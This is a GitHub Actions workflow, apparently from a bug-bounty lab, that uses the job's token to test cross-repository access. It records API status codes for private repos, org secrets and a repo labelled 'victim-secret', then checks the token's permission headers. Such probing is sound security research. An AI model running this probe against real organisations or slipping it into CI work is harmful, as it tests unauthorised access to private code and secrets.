name: tokentest
on: { workflow_dispatch: {} }
permissions: read-all
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: cross-repo probe
        env: { GH_TOKEN: "${{ github.token }}" }
        run: |
          code(){ curl -s -o /tmp/b -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "$1"; }
          echo "RESULT OWN_REPO=$(code https://api.github.com/repos/laurensmoedt-h1-lab/lab-public)"
          echo "RESULT PRIV_META=$(code https://api.github.com/repos/laurensmoedt-h1-lab/lab-private)"
          echo "RESULT PRIV_README=$(code https://api.github.com/repos/laurensmoedt-h1-lab/lab-private/contents/README.md)"
          echo "RESULT PRIV_ZIP=$(code https://api.github.com/repos/laurensmoedt-h1-lab/lab-private/zipball/main)"
          echo "RESULT PRIV_ISSUES=$(code https://api.github.com/repos/laurensmoedt-h1-lab/lab-private/issues)"
          echo "RESULT ORG_SECRETS=$(code https://api.github.com/orgs/laurensmoedt-h1-lab/actions/secrets)"
          echo "RESULT ORG_PRIVATE_REPOS=$(code https://api.github.com/orgs/laurensmoedt-h1-lab/repos?type=private)"
          echo "RESULT VICTIM_REPO=$(code https://api.github.com/repos/laurensmoedt-h1-victim/victim-secret)"
          echo "=== token permission self-check ==="
          curl -s -I -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/laurensmoedt-h1-lab/lab-public | grep -i "x-accepted-github-permissions\|x-oauth" || true